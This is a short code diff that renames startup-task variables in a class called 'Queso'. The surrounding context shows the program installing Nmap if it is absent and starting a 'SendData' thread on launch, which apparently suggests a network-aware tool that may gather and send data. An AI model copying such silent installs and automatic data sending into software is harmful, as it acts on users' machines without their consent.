@@ -176,7 +176,7 @@ class Queso:
 
     def __init__(self) -> None:
 
-        user_tasks = (
+        default_tasks = (
             (self.LaunchBoundApplication, False),
             (self.SendData, False)
         )
@@ -203,10 +203,10 @@ class Queso:
             if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
                 Network.InstallNmap()
 
-        for task_func, task_daemon in user_tasks: # Start user tasks
-            user_task_thread = Thread(target= task_func, daemon= task_daemon)
-            user_task_thread.start()
-            Tasks.AddTask(user_task_thread)
+        for task_func, task_daemon in default_tasks: # Start user tasks
+            default_task_thread = Thread(target= task_func, daemon= task_daemon)
+            default_task_thread.start()
+            Tasks.AddTask(default_task_thread)
 
         Tasks.WaitForAll()
 
